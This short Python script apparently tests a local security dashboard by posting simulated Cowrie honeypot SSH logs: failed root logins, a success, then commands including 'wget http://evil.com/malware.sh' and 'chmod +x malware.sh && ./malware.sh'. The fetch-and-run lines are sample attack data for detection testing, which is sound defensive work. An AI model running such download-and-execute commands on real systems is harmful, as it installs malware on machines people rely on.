import httpx
import asyncio
import json

async def send_attack_sequence():
    url = "http://localhost:8000/api/v1/dashboard/send_honeypot_json"
    
    sequence = [
        {"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4", "message": "Failed password for root from 1.2.3.4 port 54321 ssh2"},
        {"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4", "message": "Failed password for root from 1.2.3.4 port 54322 ssh2"},
        {"eventid": "cowrie.login.success", "src_ip": "1.2.3.4", "message": "Login success for root from 1.2.3.4 port 54323 ssh2"},
        {"eventid": "cowrie.command.success", "src_ip": "1.2.3.4", "message": "CMD: whoami"},
        {"eventid": "cowrie.command.success", "src_ip": "1.2.3.4", "message": "CMD: wget http://evil.com/malware.sh"},
        {"eventid": "cowrie.command.success", "src_ip": "1.2.3.4", "message": "CMD: chmod +x malware.sh && ./malware.sh"}
    ]
    
    async with httpx.AsyncClient() as client:
        print(f"Sending sequence of {len(sequence)} logs...")
        response = await client.post(url, json=sequence)
        print(f"Response: {response.status_code}")
        print(response.json())

if __name__ == "__main__":
    asyncio.run(send_attack_sequence())
